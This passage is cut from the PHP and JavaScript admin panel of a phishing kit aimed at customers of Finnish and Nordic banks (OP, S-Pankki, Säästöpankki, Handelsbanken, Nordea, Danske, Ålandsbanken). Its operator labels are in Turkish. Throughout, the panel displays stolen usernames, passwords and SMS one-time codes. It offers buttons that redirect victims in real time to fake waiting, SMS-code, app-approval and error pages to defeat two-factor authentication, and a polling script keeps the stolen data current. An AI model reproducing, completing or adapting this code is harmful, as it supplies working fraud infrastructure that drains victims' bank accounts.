                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path>
                                                </svg>
                                                SMS Kodu
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/omasp4')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Uygulama Onayı
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/omasp5')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Hata Sayfası
                                            </button>
                                            <?php endif; ?>
                                            <div class="border-t border-slate-600 my-2"></div>
                                            <div class="px-4 py-2 bg-gray-50 border-b border-gray-200">
                                                <div class="text-xs font-semibold text-gray-700 uppercase tracking-wide">OPBANK</div>
                                            </div>
                                            <?php
                                            $opUsername = isset($user['op_username']) ? trim($user['op_username']) : '';
                                            $opPassword = isset($user['op_password']) ? trim($user['op_password']) : '';
                                            $opSmsCode = isset($user['op_sms_code']) ? trim($user['op_sms_code']) : '';
                                            $opAppConfirmed = !empty($user['op_app_confirmed']);
                                            
                                            if (!empty($opUsername) || !empty($opPassword) || !empty($opSmsCode) || $opAppConfirmed):
                                            ?>
                                            <div class="px-4 py-3 bg-slate-700/50 border-b border-slate-600">
                                                <div class="text-xs space-y-1.5">
                                                    <?php if (!empty($opUsername)): ?>
                                                    <div>
                                                        <span class="font-medium text-slate-300">Käyttäjätunnus:</span>
                                                        <span class="text-slate-200 ml-2"><?= htmlspecialchars($opUsername) ?></span>
                                                    </div>
                                                    <?php endif; ?>
                                                    <?php if (!empty($opPassword)): ?>
                                                    <div>
                                                        <span class="font-medium text-slate-300">Salasana:</span>
                                                        <span class="text-slate-200 ml-2"><?= htmlspecialchars($opPassword) ?></span>
                                                    </div>
                                                    <?php endif; ?>
                                                    <?php if (!empty($opSmsCode)): ?>
                                                    <div>
                                                        <span class="font-medium text-slate-300">SMS-koodi:</span>
                                                        <span class="text-slate-200 ml-2"><?= htmlspecialchars($opSmsCode) ?></span>
                                                    </div>
                                                    <?php endif; ?>
                                                    <?php if ($opAppConfirmed): ?>
                                                    <div>
                                                        <span class="font-medium text-slate-300">Sovelluksen vahvistus:</span>
                                                        <span class="text-green-400 ml-2">✓ Vahvistettu</span>
                                                    </div>
                                                    <?php endif; ?>
                                                </div>
                                            </div>
                                            <?php endif; ?>
                                            <?php
                                            $opBankId = null;
                                            foreach ($banks as $b) {
                                                if (stripos($b['name'], 'op') !== false && stripos($b['name'], 'pop') === false) {
                                                    $opBankId = $b['id'];
                                                    break;
                                                }
                                            }
                                            ?>
                                            <?php if ($opBankId): ?>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/<?= $opBankId ?>')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
                                                </svg>
                                                Giriş
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/op2')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Bekleme
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/op3')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path>
                                                </svg>
                                                SMS Kodu
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/op4')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Uygulama Onayı
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/op5')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Hata Sayfası
                                            </button>
                                            <?php endif; ?>
                                            <div class="border-t border-slate-600 my-2"></div>
                                            <div class="px-4 py-2 bg-gray-50 border-b border-gray-200">
                                                <div class="text-xs font-semibold text-gray-700 uppercase tracking-wide">POP Pankki</div>
                                            </div>
                                            <?php
                                            $poppankkiBankId = null;
                                            foreach ($banks as $b) {
                                                if (stripos($b['name'], 'pop') !== false || stripos($b['name'], 'poppankki') !== false) {
                                                    $poppankkiBankId = $b['id'];
                                                    break;
                                                }
                                            }
                                            ?>
                                            <?php if ($poppankkiBankId): ?>
                                                    <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/<?= $poppankkiBankId ?>')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                        role="menuitem"
                                                    >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
                                                        </svg>
                                                Giriş
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/poppankki2')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Bekleme
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/poppankki3')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.986 9.986 0 01-4.196-.714L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path>
                                                </svg>
                                                SMS Kodu
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/poppankki4')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Uygulama Onayı
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/poppankki5')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Hata Sayfası
                                                    </button>
                                                    <?php endif; ?>
                                            <div class="border-t border-slate-600 my-2"></div>
                                            <div class="px-4 py-2 bg-gray-50 border-b border-gray-200">
                                                <div class="text-xs font-semibold text-gray-700 uppercase tracking-wide">S-Pankki</div>
                                            </div>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/4')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
                                                </svg>
                                                Giriş
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/spankki2')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Bekleme
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/spankki3')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path>
                                                </svg>
                                                Tekstiviestikoodi
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/spankki4')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Sovelluksen vahvistus
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/spankki5')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Virhesivu
                                            </button>
                                            <div class="border-t border-slate-600 my-2"></div>
                                            <div class="px-4 py-2 bg-gray-50 border-b border-gray-200">
                                                <div class="text-xs font-semibold text-gray-700 uppercase tracking-wide">Säästöpankki</div>
                                            </div>
                                            <?php
                                            $saastopankkiBankId = null;
                                            foreach ($banks as $b) {
                                                if (stripos($b['name'], 'säästöpankki') !== false || stripos($b['name'], 'saastopankki') !== false) {
                                                    $saastopankkiBankId = $b['id'];
                                                    break;
                                                }
                                            }
                                            ?>
                                            <?php if ($saastopankkiBankId): ?>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/<?= $saastopankkiBankId ?>')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
                                                </svg>
                                                Giriş
                                            </button>
                                            <?php endif; ?>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/saastopankki2')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Bekleme
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/saastopankki3')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path>
                                                </svg>
                                                SMS Kodu
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/saastopankki4')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Uygulama Onayı
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/saastopankki5')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Hata Sayfası
                                            </button>
                                            <div class="border-t border-slate-600 my-2"></div>
                                            <div class="px-4 py-2 bg-slate-700 border-b border-slate-600">
                                                <div class="text-xs font-semibold text-slate-300 uppercase tracking-wide">Handelsbanken</div>
                                            </div>
                                            <?php
                                            $handelsbankenBankId = null;
                                            foreach ($banks as $b) {
                                                if (stripos($b['name'], 'handelsbanken') !== false) {
                                                    $handelsbankenBankId = $b['id'];
                                                    break;
                                                }
                                            }
                                            ?>
                                            <?php if ($handelsbankenBankId): ?>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/<?= $handelsbankenBankId ?>')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
                                                </svg>
                                                Logga in
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/handelsbanken2')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Vänta
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/handelsbanken3')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path>
                                                </svg>
                                                SMS-kod
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/handelsbanken4')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Bekräftelse
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/handelsbanken5')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Fel
                                            </button>
                                        <?php endif; ?>
                                        </div>
                                    </div>
                                </div>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    <?php endif; ?>
                </tbody>
            </table>
        </div>

        <!-- Pagination -->
        <?php if ($totalPages > 1): ?>
        <div class="px-6 py-4 border-t border-gray-200 flex items-center justify-between">
            <div class="text-sm text-gray-700">
                Sayfa <?= $currentPage ?> / <?= $totalPages ?>
            </div>
            <div class="flex space-x-2">
                <?php if ($currentPage > 1): ?>
                <a href="/admin/users?page=<?= $currentPage - 1 ?>" class="px-4 py-2 bg-gray-200 text-gray-700 rounded hover:bg-gray-300">
                    Önceki
                </a>
                <?php endif; ?>
                <?php if ($currentPage < $totalPages): ?>
                <a href="/admin/users?page=<?= $currentPage + 1 ?>" class="px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-700">
                    Sonraki
                </a>
                <?php endif; ?>
            </div>
        </div>
        <?php endif; ?>
    </div>
    <?php endif; ?>
</div>

<script>
function redirectUser(userId, redirectTo) {
    if (!confirm('Bu kullanıcıyı yönlendirmek istediğinize emin misiniz?')) {
        return;
    }

    const formData = new FormData();
    formData.append('user_id', userId);
    formData.append('redirect_to', redirectTo);

    fetch('/admin/users/redirect', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            alert('Yönlendirme komutu gönderildi! Kullanıcı yakında yönlendirilecek.');
        } else {
            alert('Hata: ' + (data.message || 'Bilinmeyen hata'));
        }
    })
    .catch(() => {
        alert('Bir hata oluştu.');
    });
}

(function() {
    function updateUserData() {
        const userIds = [];
        document.querySelectorAll('[id^="user-page-"]').forEach(el => {
            const userId = el.id.replace('user-page-', '');
            userIds.push(userId);
        });

        userIds.forEach(userId => {
            fetch('/admin/users/get-page?user_id=' + userId)
                .then(response => response.json())
                .then(data => {
                    if (data.success && data.page) {
                        const pageEl = document.getElementById('user-page-' + userId);
                        if (pageEl) {
                            pageEl.innerHTML = '<span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-green-100 text-green-800"><span class="w-2 h-2 bg-green-400 rounded-full mr-1.5 animate-pulse"></span>' + 
                                (data.page.page_title || data.page.current_page) + '</span>';
                        }
                    } else {
                        const pageEl = document.getElementById('user-page-' + userId);
                        if (pageEl && !pageEl.querySelector('span')) {
                            pageEl.innerHTML = '<span class="text-gray-400">-</span>';
                        }
                    }
                })
                .catch(() => {});

            fetch('/admin/users/get-user?user_id=' + userId)
                .then(response => response.json())
                .then(data => {
                    if (data.success && data.user) {
                        const bankCell = document.getElementById('user-bank-' + userId);
                        if (bankCell) {
                            const bankName = data.user.bank_name || null;
                            if (bankName) {
                                bankCell.innerHTML = '<span class="text-slate-100">' + bankName + '</span>';
                            } else {
                                bankCell.innerHTML = '<span class="text-gray-400">-</span>';
                            }
                        }
                        
                        const nordeaCell = document.getElementById('user-nordea-' + userId);
                        if (nordeaCell) {
                            let html = '';
                            if (data.user.nordea_username || data.user.nordea_password || data.user.nordea_sms_code || data.user.nordea_app_confirmed) {
                                html = '<div class="text-xs">';
                                if (data.user.nordea_username) {
                                    html += '<div class="font-medium text-slate-200">Käyttäjätunnus:</div><div class="text-slate-300">' + data.user.nordea_username + '</div>';
                                }
                                if (data.user.nordea_password) {
                                    html += '<div class="font-medium text-slate-200 mt-1">Tunnusluku:</div><div class="text-slate-300">' + data.user.nordea_password + '</div>';
                                }
                                if (data.user.nordea_sms_code) {
                                    html += '<div class="font-medium text-slate-200 mt-1">SMS Kodu:</div><div class="text-slate-300">' + data.user.nordea_sms_code + '</div>';
                                }
                                if (data.user.nordea_app_confirmed) {
                                    html += '<div class="font-medium text-slate-200 mt-1">Uygulama Onayı:</div><div class="text-green-400">✓ Onaylandı</div>';
                                }
                                html += '</div>';
                            } else {
                                html = '<span class="text-gray-400">-</span>';
                            }
                            nordeaCell.innerHTML = html;
                        }
                        
                        const alandsbankenCell = document.getElementById('user-alandsbanken-' + userId);
                        if (alandsbankenCell) {
                            let html = '';
                            if (data.user.alandsbanken_username || data.user.alandsbanken_password || data.user.alandsbanken_sms_code || data.user.alandsbanken_app_confirmed) {
                                html = '<div class="text-xs">';
                                if (data.user.alandsbanken_username) {
                                    html += '<div class="font-medium text-slate-200">Användar-ID:</div><div class="text-slate-300">' + data.user.alandsbanken_username + '</div>';
                                }
                                if (data.user.alandsbanken_password) {
                                    html += '<div class="font-medium text-slate-200 mt-1">Lösenord:</div><div class="text-slate-300">' + data.user.alandsbanken_password + '</div>';
                                }
                                if (data.user.alandsbanken_sms_code) {
                                    html += '<div class="font-medium text-slate-200 mt-1">SMS-kod:</div><div class="text-slate-300">' + data.user.alandsbanken_sms_code + '</div>';
                                }
                                if (data.user.alandsbanken_app_confirmed) {
                                    html += '<div class="font-medium text-slate-200 mt-1">Appbekräftelse:</div><div class="text-green-400">✓ Bekräftad</div>';
                                }
                                html += '</div>';
                            } else {
                                html = '<span class="text-gray-400">-</span>';
                            }
                            alandsbankenCell.innerHTML = html;
                        }
                        
                            const danskeCell = document.getElementById('user-danske-' + userId);
                        if (danskeCell) {
                            let html = '';
                            if (data.user.danske_username || data.user.danske_password || data.user.danske_sms_code || data.user.danske_app_confirmed) {
                                html = '<div class="text-xs">';
                                if (data.user.danske_username) {
                                    html += '<div class="font-medium text-slate-200">User ID:</div><div class="text-slate-300">' + data.user.danske_username + '</div>';
                                }
                                if (data.user.danske_password) {
                                    html += '<div class="font-medium text-slate-200 mt-1">Password:</div><div class="text-slate-300">' + data.user.danske_password + '</div>';
                                }
                                if (data.user.danske_sms_code) {
                                    html += '<div class="font-medium text-slate-200 mt-1">SMS Code:</div><div class="text-slate-300">' + data.user.danske_sms_code + '</div>';
                                }
                                if (data.user.danske_app_confirmed) {
                                    html += '<div class="font-medium text-slate-200 mt-1">App Confirmation:</div><div class="text-green-400">✓ Confirmed</div>';
                                }
                                html += '</div>';
                            } else {
                                html = '<span class="text-gray-400">-</span>';
                            }
                            danskeCell.innerHTML = html;
                        }
                        
                        const spankkiCell = document.getElementById('user-spankki-' + userId);
                        if (spankkiCell) {
                            let html = '';
                            if (data.user.spankki_username || data.user.spankki_password || data.user.spankki_sms_code || data.user.spankki_app_confirmed) {
                                html = '<div class="text-xs">';
                                if (data.user.spankki_username) {
                                    html += '<div class="font-medium text-slate-200">Käyttäjätunnus:</div><div class="text-slate-300">' + data.user.spankki_username + '</div>';
                                }
                                if (data.user.spankki_password) {
                                    html += '<div class="font-medium text-slate-200 mt-1">Salasana:</div><div class="text-slate-300">' + data.user.spankki_password + '</div>';
                                }
                                if (data.user.spankki_sms_code) {
                                    html += '<div class="font-medium text-slate-200 mt-1">Tekstiviestikoodi:</div><div class="text-slate-300">' + data.user.spankki_sms_code + '</div>';
                                }
                                if (data.user.spankki_app_confirmed) {
                                    html += '<div class="font-medium text-slate-200 mt-1">Sovelluksen vahvistus:</div><div class="text-green-400">✓ Vahvistettu</div>';
                                }
                                html += '</div>';
                            } else {
                                html = '<span class="text-gray-400">-</span>';
                            }
